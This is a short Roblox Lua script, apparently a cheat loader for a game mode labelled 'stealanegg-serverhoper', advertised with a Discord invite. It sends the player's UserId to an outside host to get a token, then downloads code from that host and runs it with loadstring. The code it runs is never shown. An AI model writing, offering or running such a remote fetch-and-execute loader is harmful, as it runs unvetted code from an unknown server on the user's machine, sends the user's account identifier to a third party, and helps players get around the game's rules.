-- This file was generated at discord.gg/syncrypt

local LocalPlayer = game:GetService("Players").LocalPlayer
local v2 = LocalPlayer and LocalPlayer.UserId or 0
local str = tostring(tick())
local v4 = game:HttpGet("https://scriptfarmer.dpdns.org/api/authtoken/generate?roblox_id=" .. tostring(v2) .. "&cb=" .. str)
local v5 = game:HttpGet("https://scriptfarmer.dpdns.org/code/stealanegg-serverhoper?token=" .. v4 .. "&roblox_id=" .. tostring(v2) .. "&cb=" .. str)
local v6, v7 = loadstring(v5)

if v6 then
	v6()

	return
end
warn("Failed to load script: " .. tostring(v7))
